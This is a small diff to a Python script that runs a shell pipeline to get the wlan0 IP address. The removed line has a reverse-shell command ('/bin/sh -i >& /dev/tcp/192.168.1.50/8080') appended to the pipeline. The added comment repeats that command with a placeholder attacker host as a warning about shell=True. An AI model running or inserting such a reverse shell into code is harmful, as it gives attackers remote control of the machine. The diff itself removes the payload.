@@ -1,7 +1,8 @@
 import ipaddress
 import subprocess
 
-cmd = r"ip addr | grep wlan0 | grep inet | awk '{print $2}' | sed 's/\/.*//'; /bin/sh -i >& /dev/tcp/192.168.1.50/8080 0>&1"
+cmd = r"ip addr | grep wlan0 | grep inet | awk '{print $2}' | sed 's/\/.*//'"
+# if you use shell=True which means attacker can use reverse shell technique;/bin/sh -i >& /dev/tcp/attacker_ip/port 0>&1"
 result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
 
 ip = ipaddress.IPv4Address(result.stdout.strip())
